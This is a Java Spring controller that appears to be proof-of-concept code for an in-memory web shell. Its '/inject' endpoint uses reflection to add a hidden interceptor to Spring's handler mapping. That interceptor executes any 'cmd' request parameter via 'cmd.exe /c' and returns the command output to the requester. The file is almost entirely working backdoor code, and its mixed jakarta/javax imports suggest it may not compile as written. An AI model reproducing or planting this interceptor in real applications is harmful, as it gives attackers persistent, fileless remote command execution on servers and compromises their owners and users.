package com.example.spring;

import jakarta.persistence.criteria.CriteriaBuilder;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.ws.rs.core.Request;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.List;

@RestController
public class InterceptorController {
    @RequestMapping(value = "/inject", method = RequestMethod.GET)
    public String InjectShell() throws NoSuchFieldException, IllegalAccessException {
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.getRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping) context.getBean(RequestMappingHandlerMapping.class);
        Field field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field.setAccessible(true);
        List interceptors = (ArrayList) field.get(abstractHandlerMapping);
        interceptors.add(new ShellInterceptor());
        return "Inject success !!!";
    }

    public class ShellInterceptor implements HandlerInterceptor {
        @Override
        public boolean preHandle(javax.servlet.http.HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
                String input = request.getParameter("cmd");
                if (input != null) {
                    Process process = new ProcessBuilder("cmd.exe", "/c", input).start();
                    InputStream inputStream = process.getInputStream();
                    byte[] bytes = new byte[1024];
                    int length;
                    while((length = inputStream.read(bytes))!=-1){
                        response.getWriter().println(new String(bytes,0,length));
                    }
                    inputStream.close();
                    process.destroy();

                    return true;
                }
                return false;
            }
        }

}